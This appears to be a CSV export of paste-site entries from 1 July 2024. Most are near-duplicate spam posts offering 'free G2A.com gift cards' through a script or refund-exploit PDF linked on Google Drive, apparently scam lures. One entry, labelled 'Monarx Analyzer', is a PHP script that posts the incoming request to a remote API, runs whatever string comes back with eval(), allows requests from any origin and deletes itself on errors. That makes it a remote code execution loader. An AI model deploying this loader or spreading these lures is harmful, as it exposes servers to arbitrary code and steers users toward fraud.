id,title,username,language,date,content
XsS8iZLq,🤑G2A.com Free Gift Card FIX July 2024🎁,PetrikDev,JavaScript,Monday 1st of July 2024 01:05:01 AM CDT,"G2A.com free gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
yzqPpGxK,🤑G2A.com Free Gift Card FIX July 2024🤑,romikdikson,JavaScript,Monday 1st of July 2024 01:00:46 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
62KYc30H,🤑G2A.com Free Gift Card FIX July 2024🤑,x3kiN,JavaScript,Monday 1st of July 2024 12:58:58 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
6eBB8xcD,🤑G2A.com Free Gift Card FIX July 2024🤑,Justpit,JavaScript,Monday 1st of July 2024 12:54:42 AM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Steam gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
BuDg4XhD,🤑G2A.com Free Gift Card FIX July 2024🎁,FeasModz514,JavaScript,Monday 1st of July 2024 12:52:53 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
D8ShQ0iP,Monarx Analyzer,willysec_id,PHP,Monday 1st of July 2024 12:48:41 AM CDT,"<?php
error_reporting(E_ERROR);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ignore_user_abort(true);
set_time_limit(60000);
ini_set(""max_execution_time"", 60000);

header(""Access-Control-Allow-Origin: *"");
header(""Access-Control-Allow-Methods: GET, POST, OPTIONS"");
header(""Access-Control-Allow-Headers: *"");

final class MonarxSecuritySiteAnalyzer
{
    private $instructions;

    public function __construct()
    {
        $req_body = $this->getRequestBody();

        if (is_array($req_body)) {
            $req_body[""file_hash""] = $this->getFileHash();
        }

        $endpoint = $this->getEndpoint($req_body);
        $this->instructions = $this->httpPost($endpoint, $req_body);
    }

    private function getEndpoint($req_body)
    {
        $subdomain = """";
        $subdomains = [
            ""mx-prod"" => """",
            ""mx-stage"" => ""stage"",
            ""mx-dev"" => ""dev"",
        ];

        if (
            isset($req_body[""env""]) &&
            array_key_exists($req_body[""env""], $subdomains)
        ) {
            $subdomain = $subdomains[$req_body[""env""]];
        }

        if (strlen($subdomain) > 0) {
            $subdomain = "".$subdomain"";
        }

        return ""https://api$subdomain.monarx.com/v1/intelligence/site-analysis/register"";
    }

    private function getRequestBody()
    {
        $input = file_get_contents(""php://input"");

        if ($input === false) {
            $this->handleError(""Failed to read input"");
        }

        $decoded = json_decode($input, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            $this->handleError(""Logging off. Goodbye!"", true);
        }

        return $decoded;
    }

    private function getFileHash()
    {
        $file_path = __FILE__;
        $file_contents = file_get_contents($file_path);

        if ($file_contents === false) {
            $this->handleError(""Failed to load checksum"");
        }

        return hash(""sha256"", $file_contents);
    }

    private function httpPost($url, $data)
    {
        $payload = json_encode($data);

        if ($payload === false) {
            $this->handleError(""Failed to encode payload"");
        }

        $ch = curl_init($url);

        if ($ch === false) {
            $this->handleError(""Failed to initialize request"");
        }

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            ""Content-Type: application/json"",
        ]);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_USERAGENT, ""Monarx Security"");

        $result = curl_exec($ch);
        if ($result === false) {
            curl_close($ch);
            $this->handleError(""Failed to connect"", true);
        }

        curl_close($ch);
        return $result;
    }

    public function run()
    {
        if (!empty($this->instructions)) {
            if ($this->validateInstructions($this->instructions)) {
                eval($this->instructions);
            } else {
                $this->handleError(""Invalid instructions received"", true);
            }
        } else {
            $this->handleError(""No instructions received"", true);
        }
    }

    private function validateInstructions($instructions)
    {
        return is_string($instructions);
    }

    private function handleError($message, $deleteSelf = false)
    {
        echo json_encode(array(""error"" => $message, ""success"" => false));

        if ($deleteSelf) {
            @unlink(__FILE__);
        }

        exit();
    }
}

try {
    $mnx = new MonarxSecuritySiteAnalyzer();
    $mnx->run();
} catch (Exception $e) {
    $error_message = ""Unknown error occurred"";
    echo json_encode(array(""error"" => $error_message, ""success"" => false));
    @unlink(__FILE__);
}
?>"
ZiwQvHQ8,🤑G2A.com Free Gift Card FIX July 2024🤑,DownloadPizza,JavaScript,Monday 1st of July 2024 12:48:39 AM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
ChwtWdrq,🤑G2A.com Free Gift Card FIX July 2024🤑,kiraezwhethe,JavaScript,Monday 1st of July 2024 12:46:50 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
Jqb5dyce,🎁 G2A.COM FREE GIFT CARD GUIDE JUL 2024 V4 🎁,jusst2k4,GetText,Monday 1st of July 2024 12:43:14 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_193381.pdf
 
Working as of:
01 July 2024"
cQ803i8g,🤑G2A.com Free Gift Card FIX July 2024🤑,ROBLOX_PLSCHIL1O_O,JavaScript,Monday 1st of July 2024 12:42:37 AM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
